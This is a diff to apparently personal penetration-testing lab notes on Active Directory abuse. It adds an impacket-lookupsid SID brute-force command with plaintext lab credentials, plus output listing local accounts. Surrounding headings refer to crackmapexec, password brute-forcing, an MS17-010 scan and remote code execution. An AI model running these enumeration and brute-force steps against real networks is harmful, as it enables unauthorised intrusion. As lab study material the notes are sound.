@@ -21,6 +21,22 @@ crackmapexec
 	SMB         192.168.200.100 445    ODIN             [*] Windows Server 2012 R2 Standard Evaluation 9600 x64 (name:ODIN) (domain:valhalla.local) (signing:True) (SMBv1:True)
 
 
+## Enum Local users
+
+
+	┌──(kali㉿kali)-[~/Desktop/ADAbuse]
+	└─$ /usr/bin/impacket-lookupsid valhalla/thor:Pass123\!@192.168.200.110
+	Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation
+
+	[*] Brute forcing SIDs at 192.168.200.110
+	[*] StringBinding ncacn_np:192.168.200.110[\pipe\lsarpc]
+	[*] Domain SID is: S-1-5-21-3401829504-2746700306-4210517594
+	500: THOR\Administrator (SidTypeUser)
+	501: THOR\Guest (SidTypeUser)
+	513: THOR\None (SidTypeGroup)
+	1000: THOR\win7 (SidTypeUser)
+
+
 ## Password Bruteforce
 
 Metasploit
@@ -132,7 +148,6 @@ Crackmapexec
 	msf6 auxiliary(scanner/smb/smb_ms17_010) > 
 	
 
-![[Pasted image 20210813024740.png]]
 
 # Remote Code Execution
 
